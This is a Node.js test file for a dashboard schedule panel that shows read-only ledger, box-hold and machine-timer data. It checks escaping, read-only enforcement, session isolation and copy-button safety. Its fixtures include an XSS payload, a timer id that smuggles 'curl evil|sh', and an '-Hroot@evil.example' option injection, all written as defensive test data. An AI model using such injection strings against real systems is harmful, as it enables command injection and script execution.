/**
 * Schedule panel PR 3: the read-only sources on the page. The box hold in Now, ledger windows in
 * the agenda, stale ledger rows and old/failed machine data in the strip with their fixes, the
 * Box and Machines chips (only when their source exists), "On the machines" grouped by host,
 * no controls on read-only rows, a POST naming a read-only id → 400, HTML from the files
 * escaped, and a generic install showing none of it. Real init-db into a tmpdir.
 */
import { test, after, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";

const tmpDir = mkdtempSync(join(tmpdir(), "crow-sched-src-"));
execFileSync(process.execPath, ["scripts/init-db.js"], { env: { ...process.env, CROW_DATA_DIR: tmpDir }, stdio: "pipe" });
process.env.CROW_DATA_DIR = tmpDir;
const { createDbClient } = await import("../servers/db.js");
const db = createDbClient(join(tmpDir, "crow.db"));
const { default: panel, _setBotGateForTest } = await import("../servers/gateway/dashboard/panels/schedule.js");
const { readOnlySources, shellQuote, REFRESH_DOCS } = await import("../servers/gateway/schedule-sources/index.js");
const { agendaGroups } = await import("../servers/gateway/schedule-catalog.js");
const { _resetHostTimersCache, SCHEMA } = await import("../servers/gateway/schedule-sources/host-timers.js");
const { renderSchedulePage } = await import("../servers/gateway/dashboard/panels/schedule/html.js");
_setBotGateForTest({ engine: () => "ready", runtimeOn: async () => true });

const saved = { ledger: process.env.CROW_BOX_LEDGER_PATH, timers: process.env.CROW_HOST_TIMERS_DIR, hold: process.env.CROW_BOX_RESERVATION_PATH, home: process.env.CROW_HOME };
after(() => {
  _setBotGateForTest(null);
  for (const [k, v] of [["CROW_BOX_LEDGER_PATH", saved.ledger], ["CROW_HOST_TIMERS_DIR", saved.timers], ["CROW_BOX_RESERVATION_PATH", saved.hold], ["CROW_HOME", saved.home]]) {
    if (v === undefined) delete process.env[k]; else process.env[k] = v;
  }
  try { db.close(); } catch {}
  rmSync(tmpDir, { recursive: true, force: true });
});

const HOUR = 3_600_000;
const iso = (ms) => new Date(ms).toISOString();
const ymd = (ms) => iso(ms).slice(0, 10);
const hm = (ms) => iso(ms).slice(11, 16);

/** A fresh scratch area: ledger, timers folder and hold file under one tmpdir. */
function scratch() {
  const d = mkdtempSync(join(tmpdir(), "crow-sched-src-files-"));
  mkdirSync(join(d, "timers"));
  mkdirSync(join(d, "home"));
  return { d, ledger: join(d, "ledger.md"), timers: join(d, "timers"), hold: join(d, "hold.json"), home: join(d, "home") };
}
function generic(sc) {
  delete process.env.CROW_BOX_LEDGER_PATH;
  delete process.env.CROW_HOST_TIMERS_DIR;
  process.env.CROW_HOME = sc.home; // no host-timers folder in it
  process.env.CROW_BOX_RESERVATION_PATH = sc.hold; // no file
  _resetHostTimersCache();
}
function configured(sc) {
  process.env.CROW_BOX_LEDGER_PATH = sc.ledger;
  process.env.CROW_HOST_TIMERS_DIR = sc.timers;
  process.env.CROW_BOX_RESERVATION_PATH = sc.hold;
  _resetHostTimersCache();
}

/** The ledger, in UTC (the instance zone here), relative to now. */
function writeLedger(sc, now) {
  const soon = now + 3 * HOUR, past = now - 30 * HOUR;
  writeFileSync(sc.ledger, [
    "## Reservations", "",
    "| when | what | owner | how | clear |", "|---|---|---|---|---|",
    `| **${ymd(soon)} ${hm(soon)} → cap 45 min** | **Benchmark <b>window</b>** | alex | a unit | done |`,
    `| **${ymd(past)} ${hm(past)} → cap 30 min** | **Forgotten run** | alex | a unit | done |`,
    `| 2026-09-10 10:15 → ONGOING (standing service) | Speech service | alex | a service | never |`,
    `| ~~${ymd(past)} ${hm(past)} → cap 1 h~~ | ~~Cleared run~~ | alex | a unit | done |`,
    "", "## Other", "",
  ].join("\n"));
}
function writeTimers(sc, now, { old = false } = {}) {
  writeFileSync(join(sc.timers, "box-1.json"), JSON.stringify({
    schema: SCHEMA, host: "box-1", tz: "UTC", collected_at: iso(old ? now - 3 * HOUR : now - 5 * 60_000),
    timers: [
      { id: "user:model-watch.timer", kind: "systemd-user", name: "model-watch", schedule: "every 2 h", next: iso(now + 2 * HOUR), last: iso(now), last_result: "success" },
      { id: "user:backup.timer", kind: "systemd-user", name: "backup <img src=x onerror=alert(1)>", schedule: "daily", next: iso(now + 20 * HOUR), last: iso(now - 4 * HOUR), last_result: "exit-code" },
      { id: "user:x; curl evil|sh", kind: "systemd-user", name: "sneaky", last_result: "failed" },
      { id: "cron:2", kind: "cron", name: "TOKEN=abc123 /srv/collect.sh --pass hunter2", schedule: "*/15 * * * *" },
    ],
  }));
}

beforeEach(async () => {
  await db.batch([
    "DELETE FROM schedules", "DELETE FROM schedule_runs",
    "DELETE FROM dashboard_settings WHERE key IN ('instance_timezone','feature_flags','notification_prefs')",
  ]);
  await db.execute({ sql: "INSERT INTO dashboard_settings (key, value) VALUES ('instance_timezone', 'UTC')", args: [] });
  await db.execute("DELETE FROM oauth_tokens WHERE client_id = 'dashboard'");
  const h = (x) => createHash("sha256").update(x).digest("hex");
  await db.execute({ sql: "INSERT INTO oauth_tokens (token, token_type, client_id, scopes, expires_at) VALUES (?, 'access', 'dashboard', 'dashboard', ?), (?, 'access', 'dashboard', 'dashboard sso', ?)", args: [h("sess-local"), iso(Date.now() + HOUR), h("sess-sso"), iso(Date.now() + HOUR)] });
});

async function call({ method = "GET", query = {}, body = {}, lang = "en", session = "sess-local" } = {}) {
  const out = { status: 200, html: null, location: null };
  const req = { method, query, body, csrfToken: "tok123", dashboardSession: session };
  const res = {
    headersSent: false,
    status(n) { out.status = n; return this; },
    set() { return this; },
    json() { this.headersSent = true; },
    redirect(a, b) { out.status = typeof a === "number" ? a : 302; out.location = typeof a === "number" ? b : a; this.headersSent = true; },
    redirectAfterPost(url) { out.status = 303; out.location = url; this.headersSent = true; },
  };
  const html = await panel.handler(req, res, { db, layout: (o) => `<title>${o.title}</title>${o.content}`, lang });
  if (html !== undefined) out.html = html;
  return out;
}

test("a generic install (no ledger path, no timers folder, no hold): no Box or Machines anything", async () => {
  const sc = scratch();
  try {
    generic(sc);
    const { html } = await call();
    assert.doesNotMatch(html, /show=box|show=machines/, "no Box / Machines chips");
    assert.doesNotMatch(html, /class="sc-row sc-row-ro"|data-fold="machines"|data-fold="standing"/);
    assert.match(html, /Everything is on schedule/);
    assert.doesNotMatch(html, /read-only\./, "no read-only lede sentence");
    const ro = readOnlySources({ now: Date.now(), zone: "UTC" });
    assert.deepEqual(ro.present, []);
    assert.deepEqual(ro.items, []);
    assert.deepEqual(ro.problems, []);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("the box: the hold is a Now item; an upcoming window is in the agenda; ongoing rows fold; cleared rows hide", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    writeLedger(sc, now);
    writeFileSync(sc.hold, JSON.stringify({ owner: "window-run", reason: "nightly benchmark", started_at: iso(now - HOUR), expires_at: iso(now + HOUR) }));
    const { html } = await call();
    assert.match(html, /show=box/, "the Box chip");
    assert.match(html, /The box is held by window-run/);
    assert.match(html, /nightly benchmark/);
    assert.match(html, /Benchmark &lt;b&gt;window&lt;\/b&gt;/, "ledger text is escaped");
    assert.doesNotMatch(html, /Benchmark <b>window/);
    assert.match(html, /Ongoing or undated box rows \(1\)/);
    assert.match(html, /Speech service/);
    assert.doesNotMatch(html, /Cleared run/);
    assert.match(html, /read-only/);
    // Read-only rows have no link, no form, no switch.
    const ro = html.match(/<li class="sc-row sc-row-ro"[\s\S]*?<\/li>/g) || [];
    assert.ok(ro.length >= 3);
    for (const li of ro) {
      assert.doesNotMatch(li, /<a |<form|<button|role="switch"/, li.slice(0, 120));
    }
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("a stale ledger row is a strip problem: Open the ledger when the viewer can open it, else Copy path (shell-quoted)", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    writeLedger(sc, now);
    const { html } = await call();
    assert.match(html, /Stale ledger row/);
    assert.match(html, /Forgotten run/);
    const viewable = readOnlySources({ now, zone: "UTC", readers: { viewable: () => true } });
    const p1 = viewable.problems.find((p) => p.code === "ledger-stale");
    assert.deepEqual(p1.fixes, [{ act: "link", href: `/dashboard/fileview?path=${encodeURIComponent(sc.ledger)}`, label: "openLedger" }]);
    const not = readOnlySources({ now, zone: "UTC", readers: { viewable: () => false } });
    const p2 = not.problems.find((p) => p.code === "ledger-stale");
    assert.deepEqual(p2.fixes, [{ act: "copy", text: shellQuote(sc.ledger), label: "copyPath" }]);
    assert.equal(shellQuote("/srv/it's here.md"), "'/srv/it'\\''s here.md'");
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("an unreadable hold is an error with a copyable release command", async () => {
  const sc = scratch();
  try {
    configured(sc);
    writeFileSync(sc.hold, "{broken");
    const { html } = await call();
    assert.match(html, /Box hold unreadable/);
    assert.match(html, /<code class="sc-mono sc-copy-text">node scripts\/ops\/box-reserve\.mjs release<\/code>/);
    assert.match(html, /data-sc-copy="node scripts\/ops\/box-reserve\.mjs release"/);
    assert.match(html, /show=box/, "a corrupt hold alone still shows the Box chip");
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("machines: the chip, a failed timer with its check command, an unsafe unit with no copy, names escaped, no cron arguments", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    writeTimers(sc, now);
    const { html } = await call();
    assert.match(html, /show=machines/);
    assert.match(html, /On the machines \(4\)/);
    assert.match(html, /backup &lt;img src=x onerror=alert\(1\)&gt; on box-1/);
    assert.doesNotMatch(html, /<img src=x/);
    assert.match(html, /data-sc-copy="systemctl --user status -- backup\.timer"/);
    // The unit with shell characters: shown as text, never on a copy button.
    assert.match(html, /sneaky on box-1/);
    assert.match(html, /isn(’|')t a plain unit name/);
    assert.doesNotMatch(html, /data-sc-copy="[^"]*curl/);
    assert.equal((html.match(/data-sc-copy=/g) || []).length, 1, "exactly one copy button: the safe unit");
    // The cron line shows its basename only.
    assert.match(html, /collect\.sh/);
    assert.doesNotMatch(html, /abc123|hunter2/);
    // The 15-min cron line goes in the frequent fold.
    assert.match(html, /Runs all the time \(1\)/);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("old machine data is a warning with a How to refresh docs link", async () => {
  const sc = scratch();
  try {
    configured(sc);
    writeTimers(sc, Date.now(), { old: true });
    const { html } = await call();
    assert.match(html, /Machine data is old: box-1/);
    assert.ok(html.includes(`href="${REFRESH_DOCS}"`));
    assert.match(REFRESH_DOCS, /guide\/schedule#machine-timers$/);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("errors come before warnings across Crow and read-only problems", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    writeLedger(sc, now); // a stale row: warning
    writeTimers(sc, now); // failed timers: errors
    const { html } = await call();
    const strip = html.slice(html.indexOf("sc-attn-list"), html.indexOf("</section>", html.indexOf("sc-attn-list")));
    assert.ok(strip.indexOf("backup &lt;img") < strip.indexOf("Stale ledger row"), "the failed timer (error) is above the stale row (warning)");
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("filter chips: ?show=box shows only box rows, ?show=crow hides them, an unknown show is All", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    writeLedger(sc, now);
    writeTimers(sc, now);
    await db.execute({ sql: "INSERT INTO schedules (task, cron_expression, next_run, enabled) VALUES ('reminder:Water the plants', '0 9 * * *', ?, 1)", args: [iso(now + 5 * HOUR)] });
    const box = (await call({ query: { show: "box" } })).html;
    assert.match(box, /Benchmark/);
    assert.doesNotMatch(box, /Water the plants/);
    assert.doesNotMatch(box, /data-fold="machines"/);
    assert.match(box, /href="\/dashboard\/schedule\?show=box" aria-current="true"/);
    assert.match(box, /Stale ledger row/, "the strip stays complete");
    assert.match(box, /backup &lt;img/, "…including other sources' problems");
    const crow = (await call({ query: { show: "crow" } })).html;
    assert.match(crow, /Water the plants/);
    assert.doesNotMatch(crow, /Benchmark|data-fold="machines"/);
    const all = (await call({ query: { show: "nope" } })).html;
    assert.match(all, /Water the plants/);
    assert.match(all, /Benchmark/);
    assert.match(all, /href="\/dashboard\/schedule" aria-current="true"/);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("a POST naming a read-only id is refused with 400 and changes nothing", async () => {
  const sc = scratch();
  try {
    configured(sc);
    writeTimers(sc, Date.now());
    for (const action of ["pause", "resume", "run-now", "delete"]) {
      for (const id of ["box:0", "box:hold", "timer:box-1:0"]) {
        const r = await call({ method: "POST", body: { _csrf: "tok123", action, id, confirm: "1" } });
        assert.equal(r.status, 400, `${action} ${id}`);
      }
    }
    const g = await call({ query: { id: "timer:box-1:0" } });
    assert.equal(g.status, 302, "a read-only ref has no detail page");
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("agendaGroups: read-only items land in Now, days, frequent and standing", () => {
  const now = Date.parse("2026-10-26T12:00:00Z");
  const base = { id: null, readOnly: true, enabled: true, zone: "UTC", cadence: null };
  const g = agendaGroups([
    { ...base, ref: "box:hold", src: "box", kind: "box_hold", active: true, nextRun: now - HOUR },
    { ...base, ref: "box:1", src: "box", kind: "box_window", nextRun: now + 26 * HOUR },
    { ...base, ref: "box:2", src: "box", kind: "box_window", standing: true, nextRun: null },
    { ...base, ref: "box:3", src: "box", kind: "box_window", nextRun: now + 30 * 86_400_000 },
    { ...base, ref: "timer:a:0", src: "machines", kind: "host_timer", nextRun: now + 600_000, cadence: 15, frequent: true },
  ], { now, zone: "UTC" });
  assert.deepEqual(g.now.map((i) => i.ref), ["box:hold"]);
  assert.deepEqual(g.days.map((d) => [d.offset, d.items.map((i) => i.ref)]), [[1, ["box:1"]]]);
  assert.deepEqual(g.standing.map((i) => i.ref), ["box:2"]);
  assert.deepEqual(g.later.map((i) => i.ref), ["box:3"]);
  assert.deepEqual(g.frequent.map((i) => i.ref), ["timer:a:0"]);
});

test("timers past the total cap: the machines list says how many aren't shown", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    const many = Array.from({ length: 2300 }, (_, i) => ({ id: `user:m${i}.timer`, kind: "systemd-user", name: `m${i}` }));
    writeFileSync(join(sc.timers, "big.json"), JSON.stringify({ schema: SCHEMA, host: "big", tz: "UTC", collected_at: iso(now), timers: many }));
    const { html } = await call();
    assert.match(html, /On the machines \(2000\)/);
    assert.match(html, /300 more timers not shown\./);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("es: the read-only words are Spanish", async () => {
  const sc = scratch();
  try {
    configured(sc);
    writeTimers(sc, Date.now(), { old: true });
    writeFileSync(sc.hold, "{broken");
    const { html } = await call({ lang: "es" });
    assert.match(html, /Máquinas/);
    assert.match(html, /solo lectura/);
    assert.match(html, /Datos de máquina antiguos: box-1/);
    assert.match(html, /Copiar la orden para liberar/);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("only the owner's own session sees the read-only sources: a peer sign-in (SSO) sees none of them", async () => {
  const sc = scratch();
  try {
    configured(sc);
    const now = Date.now();
    writeLedger(sc, now);
    writeTimers(sc, now);
    writeFileSync(sc.hold, JSON.stringify({ owner: "window-run", reason: "nightly benchmark", started_at: iso(now - HOUR), expires_at: iso(now + HOUR) }));
    const own = (await call()).html;
    assert.match(own, /window-run/);
    const peer = (await call({ session: "sess-sso" })).html;
    assert.doesNotMatch(peer, /window-run|Benchmark|box-1|Stale ledger|show=box|show=machines|class="sc-row sc-row-ro"/);
  } finally { rmSync(sc.d, { recursive: true, force: true }); }
});

test("the renderer re-checks a copy command: a unit starting with '-' (an option, e.g. -H for ssh) never gets a copy button", () => {
  const agenda = { now: [], days: [], later: [], frequent: [], paused: [], done: [], standing: [] };
  const base = { lang: "en", agenda, sources: ["crow"], filter: "all", now: Date.now(), zone: "UTC", detail: null, running: new Map(), hosts: [], csrf: "x", items: [] };
  const evil = { kind: "systemd-user", id: "user:-Hroot@evil.example", name: "x", lastResult: "failed" };
  const p = (timer, text) => ({ code: "timer-failed", severity: "error", host: "h", timer: { ...timer, check: text }, fixes: [{ act: "copy", text, label: "copyCheck" }] });
  const bad = renderSchedulePage({ ...base, problems: [p(evil, "systemctl --user status -Hroot@evil.example")] });
  assert.doesNotMatch(bad, /data-sc-copy=/);
  const bad2 = renderSchedulePage({ ...base, problems: [p(evil, "systemctl --user status -- -Hroot@evil.example")] });
  assert.doesNotMatch(bad2, /data-sc-copy=/);
  const good = { kind: "systemd-user", id: "user:backup.timer", name: "backup", lastResult: "failed" };
  const ok = renderSchedulePage({ ...base, problems: [p(good, "systemctl --user status -- backup.timer")] });
  assert.match(ok, /data-sc-copy="systemctl --user status -- backup\.timer"/);
});
